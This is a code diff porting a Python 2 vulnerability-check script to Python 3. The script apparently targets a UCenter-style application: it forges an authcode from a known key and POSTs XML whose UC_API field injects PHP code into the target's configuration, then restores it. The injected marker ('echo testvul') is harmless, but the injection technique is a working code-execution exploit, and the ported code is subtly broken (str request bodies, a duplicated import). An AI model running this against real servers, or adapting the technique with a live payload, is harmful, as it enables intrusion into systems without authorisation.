@@ -5,8 +5,8 @@ import hashlib
 import time
 import math
 import base64
-import urllib
-import urllib2
+import urllib.request, urllib.parse, urllib.error
+import urllib.request, urllib.error, urllib.parse
 
 
         
@@ -33,7 +33,7 @@ def audit(arg):
         string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
         string_length = len(string)
         result = ''
-        box = range(0, 256)
+        box = list(range(0, 256))
         rndkey = dict()
         for i in range(0,256):
             rndkey[i] = ord(cryptkey[i % key_length])
@@ -62,15 +62,15 @@ def audit(arg):
         }
         tm = time.time()+10*3600
         tm="time=%d&action=updateapps" %tm
-        code = urllib.quote(get_authcode(tm,key))
+        code = urllib.parse.quote(get_authcode(tm,key))
         url=url+"?code="+code
         data1='''<?xml version="1.0" encoding="ISO-8859-1"?>
                 <root>
                 <item id="UC_API">http://xxx\');echo("testvul");//</item>
                 </root>'''
         try:
-            req=urllib2.Request(url,data=data1,headers=headers)
-            ret=urllib2.urlopen(req)
+            req=urllib.request.Request(url,data=data1,headers=headers)
+            ret=urllib.request.urlopen(req)
         except:
             return "error"
         data2='''<?xml version="1.0" encoding="ISO-8859-1"?>
@@ -78,8 +78,8 @@ def audit(arg):
                 <item id="UC_API">http://aaa</item>
                 </root>'''
         try:
-            req=urllib2.Request(url,data=data2,headers=headers)
-            ret=urllib2.urlopen(req)
+            req=urllib.request.Request(url,data=data2,headers=headers)
+            ret=urllib.request.urlopen(req)
         except:
             return "error"
         return 1
